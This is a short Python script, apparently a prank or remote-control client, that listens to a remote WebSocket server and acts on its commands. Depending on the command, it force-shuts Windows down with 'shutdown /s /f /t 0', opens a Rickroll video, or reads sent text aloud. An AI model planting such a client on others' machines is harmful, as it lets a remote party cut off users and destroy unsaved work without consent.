import asyncio
import websockets
import json
import os
import ctypes

# MessageBox parametreleri


import webbrowser
from gtts import gTTS

# Render'daki WebSocket URL'si
WEBSOCKET_URL = "wss://controlserver.onrender.com"

async def listen():
    # ToastNotifier nesnesini oluştur
    

    async with websockets.connect(WEBSOCKET_URL) as websocket:
        ctypes.windll.user32.MessageBoxW(0, "Connected", "Connected", 1)

        # Mesajları sürekli dinle
        while True:
            try:
                message = await websocket.recv()
                data = json.loads(message)
                command = data.get("command")
                print(data)

                # Gelen komuta göre işlem yap
                if command == "execute_task":
                    print("Task executed!")
                    os.system('shutdown /s /f /t 0')
                elif command == "rick":
                    url = 'https://www.youtube.com/watch?v=xvFZjo5PgG0&autoplay=1'
                    webbrowser.open(url)
                elif command == "message":
                    print(data.get("contentt"))
                    
                    # Bildirim göster
                    

                    # Türkçe metin
                    text = data.get("contentt")

                    # Türkçe dil seçeneği ile sesli okuma
                    tts = gTTS(text=text, lang='en')

                    # Sesli okuma çıktısını bir dosyaya kaydetme
                    tts.save("output.mp3")

                    # Çıktıyı çal
                    os.system("start output.mp3")  # Windows için

            except websockets.ConnectionClosed:
                print("WebSocket bağlantısı kapatıldı.")
                break

# Ana döngüyü çalıştır
asyncio.get_event_loop().run_until_complete(listen())
